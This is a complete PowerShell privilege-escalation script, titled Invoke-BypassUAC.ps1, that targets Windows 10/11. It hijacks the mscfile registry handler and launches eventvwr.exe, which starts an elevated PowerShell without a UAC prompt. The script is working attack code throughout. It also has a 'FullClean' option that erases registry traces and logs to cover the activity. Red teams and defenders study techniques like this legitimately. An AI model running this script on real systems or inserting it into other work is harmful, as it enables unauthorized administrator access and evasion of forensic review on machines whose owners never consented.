########################################################################################
#                                                                                      |
#                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
#                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
#                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
#                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
#                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                |
#                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
#                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
#                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
#                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |
#                                                                                      |
#     Title        : Invoke-BypassUAC.ps1                                              |
#     Link         : https://github.com/Miiraak/Scripts/tree/master/PowerShell/PrivilegeEscalation/UACBypass/ |
#     Version      : 2.5                                                               |
#     Category     : privilegeescalation/uacbypass                                     |
#     Target       : Windows 10/11                                                     |
#     Description  : Bypass UAC via eventvwr.exe registry hijack, with robust logging. |
#                    Option to clean all traces.                                       |
#                                                                                      |
########################################################################################

<#
.SYNOPSIS
    Bypass UAC using eventvwr.exe registry hijack, with full logging and cleanup options.

.DESCRIPTION
    Attempts to escalate privileges by hijacking the registry key for eventvwr.exe.
    Logs all actions to %APPDATA%\UACBypassLogs.
    Supports full cleanup of registry and log files.

.PARAMETER FullClean
    Removes all registry traces and log files, then exits.

.EXAMPLE
    .\Invoke-BypassUAC.ps1
    .\Invoke-BypassUAC.ps1 -FullClean
#>

# ---------------[Parameters]--------------- #
[CmdletBinding()]
param (
    [switch]$FullClean
)

# ---------------[Variables]--------------- #
$RegPath     = "HKCU:\Software\Classes\mscfile\shell\open\command"
$Payload     = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process powershell.exe -Verb runAs"'
$LogDir      = Join-Path $env:APPDATA "UACBypassLogs"
$LogFile     = Join-Path $LogDir ("UACBypass_{0}.log" -f (Get-Date -Format "yyyyMMdd_HHmmss"))
$EventvwrExe = "eventvwr.exe"
$SleepTime   = 6

# ---------------[Functions]--------------- #
function Ensure-LogDir {
    if (!(Test-Path $LogDir)) {
        New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
    }
}

function Write-Log {
    param (
        [string]$Msg,
        [string]$Lvl = "INFO",
        [ConsoleColor]$Color = "Gray"
    )
    $Stamp   = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $FullMsg = "[{0}] {1} :: {2}" -f $Lvl, $Stamp, $Msg
    Write-Host $FullMsg -ForegroundColor $Color
    Ensure-LogDir
    try {
        Add-Content -Path $LogFile -Value $FullMsg
    } catch {
        Ensure-LogDir
        Add-Content -Path $LogFile -Value $FullMsg
    }
}

function Write-Section {
    param ([string]$Title)
    $Line = '=' * $Title.Length
    Write-Host "`n$Title" -ForegroundColor Cyan
    Write-Host $Line -ForegroundColor Cyan
    Ensure-LogDir
    try {
        Add-Content -Path $LogFile -Value "`n$Title`n$Line"
    } catch {
        Ensure-LogDir
        Add-Content -Path $LogFile -Value "`n$Title`n$Line"
    }
}

function Cleanup-Registry {
    try {
        if (Test-Path $RegPath) {
            Remove-Item -Path $RegPath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "Registry key removed: $RegPath" "CLEANUP" "DarkGreen"
        } else {
            Write-Log "Registry key already absent." "INFO" "DarkGray"
        }
    } catch {
        Write-Log "Error cleaning registry: $($_.Exception.Message)" "WARN" "Yellow"
    }
}

function Full-CleanTraces {
    Write-Section "Full Trace Cleanup"
    Cleanup-Registry
    try {
        if (Test-Path $LogDir) {
            Remove-Item -Path $LogDir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "[CLEANUP] Log folder deleted: $LogDir" -ForegroundColor DarkGreen
        } else {
            Write-Host "[CLEANUP] Log folder already absent." -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "[CLEANUP] Error deleting log folder: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Check-Elevation {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($id)
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ---------------[Execution]--------------- #
if ($FullClean) {
    Full-CleanTraces
    Write-Host "`n[END] Full cleanup finished. All traces removed." -ForegroundColor Black -BackgroundColor Green
    exit 0
}

Write-Section "Attempting UAC Bypass (eventvwr hijack)"

Write-Log "Current user: $env:USERNAME" "INFO" "White"
Write-Log "Registry key path: $RegPath" "INFO" "Cyan"

if (Check-Elevation) {
    Write-Log "Script is already running as administrator. UAC bypass not required." "WARN" "Yellow"
    Write-Host "`n[INFO] You are already admin, bypass unnecessary." -ForegroundColor Yellow
    exit 0
}

try {
    Ensure-LogDir

    # Step 1: Inject malicious registry key
    Write-Log "Injecting payload into registry key..." "STEP" "Yellow"
    New-Item -Path $RegPath -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Payload -Force
    Write-Log "Payload injected: $Payload" "SUCCESS" "Green"

    # Step 2: Launch eventvwr.exe
    Write-Log "Launching eventvwr.exe to trigger UAC elevation..." "STEP" "Yellow"
    Start-Process $EventvwrExe
    Write-Log "$EventvwrExe launched." "INFO" "Gray"

    # Step 3: Wait for elevation to occur
    Start-Sleep -Seconds $SleepTime
    Write-Log "Paused for $SleepTime seconds..." "INFO" "DarkGray"

    # Step 4: Cleanup registry key
    Write-Log "Cleaning up registry..." "STEP" "Yellow"
    Cleanup-Registry

    Write-Log "UAC bypass finished. Check if an Admin PowerShell console appeared." "FINAL" "Magenta"
    Write-Host "`n[END] UAC bypass finished successfully. Log: $LogFile" -ForegroundColor Black -BackgroundColor Green

} catch {
    Write-Log "Error: $($_.Exception.Message)" "ERROR" "Red"
    Cleanup-Registry
    Write-Host "[ERROR] UAC bypass failed. See log: $LogFile" -ForegroundColor Red
    exit 1
}

# ---------------[End]--------------- #
Exit 0